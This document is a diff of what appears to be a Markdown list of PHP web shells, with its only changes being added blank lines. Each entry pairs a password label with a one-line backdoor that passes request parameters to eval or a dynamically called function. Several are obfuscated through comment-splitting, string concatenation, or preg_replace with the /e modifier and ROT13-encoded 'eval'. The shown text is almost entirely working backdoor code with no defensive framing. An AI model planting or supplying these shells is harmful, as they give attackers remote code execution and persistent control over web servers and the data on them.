@@ -4,6 +4,7 @@
 ```PHP
 <?php @eval($_POST['pass');?>
 ```
+
 `-7`
 ```php
 <?php
@@ -12,14 +13,17 @@
 @$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
 [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
 ```
+
 `b`
 ```php
 <?php $_GET['a']($_POST['b']);?>
 ```
+
 `sun`
 ```php
 <?php ($sun = $_POST['sun']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($sun)','add');?>
 ```
+
 `y2grc48wekjxs2h`
 ```php
 <?php
@@ -71,6 +75,7 @@ $bepa = ltrim("iyr388u99kj1i");
 $fjsa = trim("wf60mbhbupk3siceqx4");
 ?>
 ```
+
 `_`
 ```php
 <?php
